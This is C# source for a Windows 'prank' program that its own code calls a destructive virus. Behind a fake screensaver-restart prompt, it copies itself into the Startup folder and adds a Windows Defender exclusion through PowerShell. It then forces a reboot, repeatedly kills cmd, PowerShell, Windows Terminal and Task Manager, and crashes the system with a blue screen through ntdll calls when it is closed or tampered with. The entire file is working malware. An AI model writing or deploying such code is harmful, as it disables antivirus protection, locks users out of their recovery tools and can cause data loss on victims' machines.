//Aliensoft Games.All rights reserved.
//
//Hope you enjoy.
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
//Use this for file actions.
using System.IO;
//Use this for shell.
using IWshRuntimeLibrary;
//Use this for importing dll;
using System.Runtime.InteropServices;
//Use this to know when a app is running.
using System.Diagnostics;

namespace virus2
{
    public partial class Form1 : Form
    {
        //Import dll for BSOD.
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
        public Form1()
        {
            //Make the app a background process.
            this.Hide();
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            CheckConfiguration();
        }
        Timer timer;
        void CheckConfiguration()
        {
            this.Hide();
            //The path for the configuration file.
            string Path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\ScreensaverConfig.txt";
            //Check if the file exists.
            if (System.IO.File.Exists(Path))
            {
                //The array that contains the configuration settings.
                string[] OutputFile = new string[System.IO.File.ReadAllLines(Path).Length];
                //Reads the configuration file and transfer to the array.
                OutputFile = System.IO.File.ReadAllLines(Path);
                //Checks if the configuration file contains...
                if(OutputFile[0] == "1")
                {
                    this.Show();
                    label1.Text = "At this point,you can't escape anymore.";
                    label1.Refresh();
                    this.Text = Environment.UserName + " is dead.";
                    StartTimer();
                }
                //If the file is modified, generate a BSOD.
                else
                {
                    BSOD();
                }
            }
            else
            {
                //Warn the user.
                if (MessageBox.Show("This is a destructive virus.If you click 'yes',your system may be in danger! Are you sure you want to continue?", "Warning!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    CopyFile();
                }
                else
                {
                    Application.Exit();
                }
            }
        }
        void CopyFile()
        {
            this.Show();
            //Create a fake warning message and if "yes" button is clicked continue,else quit the app.
            if(MessageBox.Show("Windows needs to restart to apply the screensaver.Are you sure you want to continue?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                this.Hide();
            }
            else
            {
                Application.Exit();
                return;
            }
            //Create an array that contains a html file.
            string[] BatchFile = {"<h1>Lol,too easy " +Environment.UserName + "</h1>", "<h2>Lol,too easy " + Environment.UserName + "</h2>", "<h3>Lol,too easy " + Environment.UserName + "</h3>", "<h4>Lol,too easy " + Environment.UserName + "</h4>", "<h5>Lol,too easy " + Environment.UserName + "</h5>", "<h6>Lol,too easy " + Environment.UserName + "</h6>"};
            //Where the html file will be saved.
            string BatPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\R I C K R O L L.html";
            //Where the path for Configuration file.
            string Path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\ScreensaverConfig.txt";
            //What contains the configuration file.
            string[] Output = {"1"};
            //Copy and paste locations.
            string CopyFrom = Application.ExecutablePath;
            string PasteIn = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\CoolShapes.exe";
            //Copy and paste the file to start when Windows boots.
            System.IO.File.Copy(CopyFrom, PasteIn);
            //Create a shell object.
            WshShell shell = new WshShell();
            //Create and write the Configuration file.
            System.IO.File.WriteAllLines(Path, Output);
            //Create a sound object.
            System.Media.SoundPlayer player = new System.Media.SoundPlayer(@"C:\Windows\Media\Windows Shutdown.wav");
            //Play the sound.
            player.Play();
            //Create and write the html file.
            System.IO.File.WriteAllLines(BatPath, BatchFile);
            //Add an exclusion path for the virus to not be detected.
            shell.Exec(@"powershell -Command Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\'");
            //Restart the system.
            shell.Exec("shutdown /r");
        }
        //Create a timer so the method to be called every 500 miliseconds(1/2 seconds).
        void StartTimer()
        {
            timer = new Timer();
            timer.Tick += new EventHandler(timer_Tick);
            timer.Interval = 500;
            timer.Start();
        }
        //Run this method when the timer reaches 0.
        void timer_Tick(object sender, EventArgs e)
        {
            RandomAction();
        }
        //Create a BSOD boolean so the virus will know when will generate a BSOD.
        bool Bsod = true;
        void RandomAction()
        {
            //Create a key press event and if a key is pressed, the app will run the Form1_KeyUp method.
            this.KeyUp += Form1_KeyUp;
            //Creates a application exit event and if the app is closed, generate a BSOD.
            Application.ThreadExit += new EventHandler(App_Quit);
            //Create process array to check if is open.
            Process[] cmd = new Process[0];
            Process[] terminal = new Process[0];
            Process[] task = new Process[0];
            Process[] powershell = new Process[0];
            //Create a random object.
            Random random = new Random();
            //Where the html file will be saved.
            string BatPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\R I C K R O L L.html";
            //The number decision is a random number between 0 and 25.
            int numberDecision = random.Next(0, 25);
            //Get the process name and check if is running.
            cmd = Process.GetProcessesByName("cmd");
            terminal = Process.GetProcessesByName("WindowsTerminal");
            task = Process.GetProcessesByName("taskmgr");
            powershell = Process.GetProcessesByName("powershell");
            //Create a shell object.
            WshShell shell = new WshShell();
            //Check if the processes is running and if is, shut down.
            if (cmd.Length > 0)
            {
                cmd[0].Kill();
            }
            if (terminal.Length > 0)
            {
                terminal[0].Kill();
            }
            if(task.Length > 0)
            {
                task[0].Kill();
            }
            if(powershell.Length > 0)
            {
                powershell[0].Kill();
            }
            //Checks if the number is that value.
            if (numberDecision == 5)
            {
                //Open this link.
                Process.Start("https://www.google.com/search?q=Is+this+my+name:+" + Environment.UserName + "&oq=Is+this+my+name:" + Environment.UserName + "&aqs=chrome..69i57j33i160.7161j0j7&sourceid=chrome&ie=UTF-8");
            }
            if (numberDecision == 11)
            {
                //Open this link.
                Process.Start("https://www.youtube.com/watch?v=a3Z7zEc7AXQ");
            }
            if(numberDecision == 18)
            {
                //Open this link.
                Process.Start("https://www.amazon.de/-/en/Sedatech-Cooling-Workstation-Threadripper-Computer/dp/B08TB3ZK38/ref=dp_fod_1?pd_rd_i=B08TB3ZK38&psc=1");
            }
            if(numberDecision == 15)
            {
                //Checks if the html file exists.
                if (System.IO.File.Exists(BatPath))
                {
                    //Open the html file.
                    Process.Start(BatPath);
                }
            }
            if(numberDecision == 24)
            {
                //Create a sound object.
                System.Media.SoundPlayer player = new System.Media.SoundPlayer(@"C:\Windows\Media\Windows Shutdown.wav");
                //Play the sound.
                player.Play();
            }
        }

        //This method is called when the user presses a key.
        private void Form1_KeyUp(object sender, KeyEventArgs e)
        {
            //Don't generate a BSOD.
            Bsod = false;
            //Exits the application.
            Application.Exit();
        }

        //This method is called when the user closes the app.
        void App_Quit(object sender, EventArgs e)
        {
            //Go to BSOD method.
            BSOD();
        }
        void BSOD()
        {
            if (Bsod)
            {
                //Create a sound object.
                System.Media.SoundPlayer player = new System.Media.SoundPlayer(@"C:\Windows\Media\Windows Shutdown.wav");
                //Play the sound.
                player.Play();
                //Generate the BSOD.
                Boolean t1;
                uint t2;
                RtlAdjustPrivilege(19, true, false, out t1);
                NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
            }
        }
    }
}
